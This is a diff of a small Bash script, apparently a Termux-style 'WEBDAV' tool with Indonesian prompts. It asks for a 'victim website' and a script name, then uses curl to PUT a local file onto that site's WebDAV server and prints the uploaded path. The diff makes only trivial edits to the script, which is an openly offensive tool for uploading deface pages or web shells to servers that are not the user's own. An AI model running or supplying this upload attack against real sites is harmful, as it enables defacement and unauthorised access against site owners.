@@ -1,7 +1,6 @@
 #!/bin/bash
 
 clear
-than
 figlet -f slant "WEBDAV" | lolcat
 echo ""
 echo ""
@@ -14,7 +13,7 @@ echo ""
 echo "==============================" | lolcat
 echo ""
 echo ""
-read -p "Masukkan web korban  ~# " target
+read -p "Masukkan web korban  ~# " target;
 read -p "Nama script lu coeg  ~# "  sc;
 curl -a -T /storage/emulated/0/$sc $target
 echo "Hasilnya :v |==>"  $target/$sc
